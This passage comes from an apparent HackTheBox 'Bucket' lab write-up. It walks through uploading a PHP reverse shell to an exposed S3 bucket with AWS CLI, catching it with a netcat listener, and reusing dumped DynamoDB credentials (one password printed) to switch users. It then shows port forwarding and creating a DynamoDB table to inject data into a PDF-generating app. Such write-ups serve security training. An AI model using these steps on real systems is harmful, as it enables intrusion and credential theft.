&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;complete&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;doScan&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;provateWhich returns us a list of credentials:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-04-02_18-14-40.png&quot; alt=&quot;Screenshot_2021-04-02_18-14-40&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We take note of these and try against our known services, which at this point is only &lt;strong&gt;ssh&lt;/strong&gt;, however none of them currently work, so we pivot to another service.&lt;/p&gt;

&lt;h2 id=&quot;aws-cli-exploitation&quot;&gt;AWS CLI Exploitation&lt;/h2&gt;

&lt;p&gt;Reading a little bit about the Amazon AWS ecosystem, we decide to attempt installing its CLI management tool; &lt;strong&gt;aws&lt;/strong&gt;. After installing and configuring AWS CLI with dummy values (except region), we are now able to enumerate buckets on the machine:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[stbl@kali]─[10.10.14.251]─[~/boxes/bucket]
└──╼ &lt;span class=&quot;nv&quot;&gt;$aws&lt;/span&gt; s3 &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb
2021-04-02 19:15:09 adserver
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We note the only bucket available, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;adserver&lt;/code&gt;, which we enumerate and clone using hacktricks and Amazon CLI documentation as references:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[✗]─[stbl@kali]─[10.10.14.251]─[~/boxes/bucket/s3]
└──╼ &lt;span class=&quot;nv&quot;&gt;$aws&lt;/span&gt; s3 &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb
2021-04-02 19:29:10 adserver

┌─[✗]─[stbl@kali]─[10.10.14.251]─[~/boxes/bucket]
└──╼ &lt;span class=&quot;nv&quot;&gt;$aws&lt;/span&gt; s3 &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb s3://adserver
                           PRE images/
2021-04-02 19:21:12       5344 index.html
┌─[stbl@kali]─[10.10.14.251]─[~/boxes/bucket/s3]
└──╼ &lt;span class=&quot;nv&quot;&gt;$aws&lt;/span&gt; s3 &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;nb&quot;&gt;sync &lt;/span&gt;s3://adserver &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                                                                                                                      
download: s3://adserver/index.html to ./index.html              
download: s3://adserver/images/malware.png to images/malware.png  
download: s3://adserver/images/bug.jpg to images/bug.jpg          
download: s3://adserver/images/cloud.png to images/cloud.png    

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And further inspecting the files, we notice that this is actually the web service we were previously navigating; if we can find a way to upload files; we could gain a remote shell. The &lt;strong&gt;cp&lt;/strong&gt; command allows us to upload; so we test it first with:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[stbl@kali]─[10.10.14.251]─[~/boxes/bucket/s3]
└──╼ &lt;span class=&quot;nv&quot;&gt;$aws&lt;/span&gt; s3 &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; ./test.txt s3://adserver                 
upload: ./test.txt to s3://adserver/test.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And we can confirm it working:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-04-02_19-35-06.png&quot; alt=&quot;Screenshot_2021-04-02_19-35-06&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So we try an actual php reverse shell now: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws s3 --endpoint-url http://s3.bucket.htb cp ./rev.php s3://adserver&lt;/code&gt; and navigate to it while setting up a listener &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -lnvp 9001&lt;/code&gt;… but our reverse shell gets downloaded instead of executed. Researching why this is happening, we find out that s3 doesn’t run any sort of scripting language; so we need an alternative shell.&lt;/p&gt;

&lt;p&gt;Seems we can’t have scripting from the S3 instance, however, the main site (index.html) do seem to be served from another web server; so perhaps we can have a file uploaded there; plus the index.html located in the bucket seem to the one on the web server.  We try again to upload the shell and after modifying the upload command a little and making multiple try (ctrl+f5 on firefox), we manage to get a shell:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aws s3 &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; ./rev.php s3://adserver/rev.php  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-04-02_20-19-37.png&quot; alt=&quot;Screenshot_2021-04-02_20-19-37&quot; /&gt;&lt;/p&gt;

&lt;p&gt;:warning: &lt;em&gt;This last part was very finicky and not 100% reliable; seems like the host was cleaning itself very frequently and I was only able to get a shell after an inconsistent amount of upload and refresh.&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;shell---www-data&quot;&gt;Shell - www-data&lt;/h2&gt;

&lt;p&gt;We now have a shell as &lt;strong&gt;www-data&lt;/strong&gt;, doing standard enumeration we list users with shell on the box:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@bucket:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/passwd | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;sh&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
root:x:0:0:root:/root:/bin/bash
roy:x:1000:1000:,,,:/home/roy:/bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Roy&lt;/strong&gt; being the only account aside from root, we target this user first.&lt;/p&gt;

&lt;h3 id=&quot;privilege-escalation-www-data-to-roy&quot;&gt;Privilege Escalation: www-data to roy&lt;/h3&gt;

&lt;p&gt;Remembering the credentials we acquired by dumping the &lt;strong&gt;DynamoDB&lt;/strong&gt; service, we try to &lt;strong&gt;su&lt;/strong&gt; as &lt;em&gt;roy&lt;/em&gt; using all those password and do find a hit:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@bucket:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su roy
Password: &lt;span class=&quot;c&quot;&gt;# n2vM-&amp;lt;_K_Q:.Aa2&lt;/span&gt;
roy@bucket:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Quite the easy escalation.&lt;/p&gt;

&lt;p&gt;:warning: &lt;em&gt;We later found out we could also have ssh as roy using the above password, which would have saved a bit of hassle in the long run.&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;shell---roy&quot;&gt;Shell - roy&lt;/h2&gt;

&lt;p&gt;After getting the &lt;strong&gt;user.txt&lt;/strong&gt; flag as roy, we start basic enumeration:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Check for sudo permission with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;, but we cannot run sudo.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Search for interesting files in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;home&lt;/code&gt; directory: &lt;strong&gt;composer&lt;/strong&gt; is present. We take note if we want to look into later.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Search for special files, especially for files owned by root but readable by us, which are non-standard:&lt;/p&gt;

    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-readable&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-user&lt;/span&gt; root &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--full-time&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vE&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/sys/|/proc/|/run/|/usr/lib/|/var/lib/|/var/cache/|/usr/src/|/snap/|/boot|/usr/share|/var/www/'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Check for open ports:&lt;/p&gt;

    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;oy@bucket:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;netstat &lt;span class=&quot;nt&quot;&gt;-tunlp&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;LISTEN
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
tcp        0      0 127.0.0.1:8000          0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN      -     
tcp        0      0 127.0.0.1:43343         0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN      -     
tcp        0      0 127.0.0.53:53           0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN      -     
tcp        0      0 127.0.0.1:4566          0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN      -     
tcp        0      0 0.0.0.0:22              0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN      -     
tcp6       0      0 :::80                   :::&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN      -     
tcp6       0      0 :::22                   :::&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN      -     
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;There is definitively interesting open ports going on here, especially services listening on &lt;strong&gt;localhost&lt;/strong&gt; only. We make sure to take notes of those so we can return later.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Linpeas findings: nothing particularly interesting stands out.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Running processes: we do find one of the listening part above is running by root and seem to be the &lt;strong&gt;aws&lt;/strong&gt; service running as a docker container on &lt;strong&gt;port 4566&lt;/strong&gt;:&lt;/p&gt;

    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; root        1380  0.0  0.1 623772  6692 ?        Sl   14:57   0:03 /usr/bin/docker-proxy &lt;span class=&quot;nt&quot;&gt;-proto&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-host-ip&lt;/span&gt; 127.0.0.1 &lt;span class=&quot;nt&quot;&gt;-host-port&lt;/span&gt; 4566 &lt;span class=&quot;nt&quot;&gt;-container-ip&lt;/span&gt; 172.18.0.2 &lt;span class=&quot;nt&quot;&gt;-container-port&lt;/span&gt; 4566
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We focus on the open ports on the machine; so allow easier enumeration, we setup a port forward back to us using &lt;strong&gt;ssh&lt;/strong&gt;, after having generated a pair of keys on the machine:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 4566:127.0.0.1:4566 &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 43343:127.0.0.1:43343 &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 8000:127.0.0.1:8000 roy@10.10.10.212
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Looking at the port, starting with &lt;strong&gt;8000&lt;/strong&gt;, we find a new site, previously unseen:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-04-14_00-34-26.png&quot; alt=&quot;Screenshot_2021-04-14_00-34-26&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;investigating-the-local-website&quot;&gt;Investigating the local website&lt;/h3&gt;

&lt;p&gt;Back on the bucket machine, we locate the file (using &lt;strong&gt;grep&lt;/strong&gt; and some keywords of the page) to be in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/bucket-app/&lt;/code&gt;, so we download the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.php&lt;/code&gt; and have a look at its source code; first few lines immediately stand out:&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'vendor/autoload.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Aws\DynamoDb\DynamoDbClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;REQUEST_METHOD&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;===&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;POST&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;action&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;===&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;get_alerts&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;nb&quot;&gt;date_default_timezone_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'America/New_York'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;nv&quot;&gt;$client&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DynamoDbClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;
                        &lt;span class=&quot;s1&quot;&gt;'profile'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'default'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                        &lt;span class=&quot;s1&quot;&gt;'region'&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'us-east-1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                        &lt;span class=&quot;s1&quot;&gt;'version'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'latest'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                        &lt;span class=&quot;s1&quot;&gt;'endpoint'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'http://localhost:4566'&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;

                &lt;span class=&quot;nv&quot;&gt;$iterator&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getIterator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Scan'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
                        &lt;span class=&quot;s1&quot;&gt;'TableName'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'alerts'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                        &lt;span class=&quot;s1&quot;&gt;'FilterExpression'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;title = :title&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                        &lt;span class=&quot;s1&quot;&gt;'ExpressionAttributeValues'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;:title&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;S&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Ransomware&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$iterator&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                        &lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.html'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                        &lt;span class=&quot;nb&quot;&gt;file_put_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'files/'&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;data&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;nb&quot;&gt;passthru&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; 800 A4 -out files/result.pdf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Key points of this code:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Triggered on a POST request with data &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;action=get_alerts&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Then queries the &lt;strong&gt;dynamodb&lt;/strong&gt; table &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;alerts&lt;/code&gt; where the title is equal to &lt;em&gt;Ransomware&lt;/em&gt;.&lt;/li&gt;
  &lt;li&gt;Print the content of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data&lt;/code&gt; field on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;files/&lt;/code&gt; folder.&lt;/li&gt;
  &lt;li&gt;Convert that (or these) html files into pdf using a &lt;strong&gt;jar&lt;/strong&gt; found on the same root folder of the site.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Using the tunnel we setup, we use &lt;strong&gt;burp&lt;/strong&gt; to trigger this function:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210423034151.png&quot; alt=&quot;Pasted image 20210423034151&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, we are getting a &lt;strong&gt;500 Internal Server Error&lt;/strong&gt;. We suspect this could be due to the table not existing; so we have a look again at the &lt;strong&gt;dynamodb&lt;/strong&gt; instance.&lt;/p&gt;

&lt;h3 id=&quot;injecting-in-dynamodb&quot;&gt;Injecting in DynamoDB&lt;/h3&gt;

&lt;p&gt;Now that we also have a tunnel setup to access the &lt;strong&gt;localhost:4566&lt;/strong&gt;, we work locally using the &lt;strong&gt;aws cli&lt;/strong&gt; tools previously setup to first enumerate the db:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[✗]─[stbl@kali]─[10.10.14.216]─[~/boxes/bucket/exfil]                                     
└──╼ &lt;span class=&quot;nv&quot;&gt;$aws&lt;/span&gt; dynamodb list-tables &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://127.0.0.1:4566                           
TABLENAMES      Image                                                                       
TABLENAMES      ImageTag                                                                     
TABLENAMES      Tag                                                                        
TABLENAMES      &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;    

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As expected, we cannot find the &lt;strong&gt;alerts&lt;/strong&gt; table, so we search the Amazon documentation on how to do so and further how to add an item in it, starting with a test string;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# create the table&lt;/span&gt;
aws dynamodb create-table &lt;span class=&quot;nt&quot;&gt;--table-name&lt;/span&gt; alerts &lt;span class=&quot;nt&quot;&gt;--attribute-definitions&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;title,AttributeType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;data,AttributeType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S &lt;span class=&quot;nt&quot;&gt;--key-schema&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;title,KeyType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;HASH &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;data,KeyType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;RANGE &lt;span class=&quot;nt&quot;&gt;--provisioned-throughput&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;ReadCapacityUnits&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10,WriteCapacityUnits&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;5 &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://127.0.0.1:4566

&lt;span class=&quot;c&quot;&gt;# add a test item&lt;/span&gt;
aws dynamodb put-item &lt;span class=&quot;nt&quot;&gt;--table-name&lt;/span&gt; alerts &lt;span class=&quot;nt&quot;&gt;--item&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{&quot;title&quot;:{&quot;S&quot;:&quot;Ransomware&quot;},&quot;data&quot;:{&quot;S&quot;:&quot;TestString&quot;}}'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://127.0.0.1:4566
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And upon re-sending out POST request, a “result.pdf” file is now on the host:&lt;/p&gt;

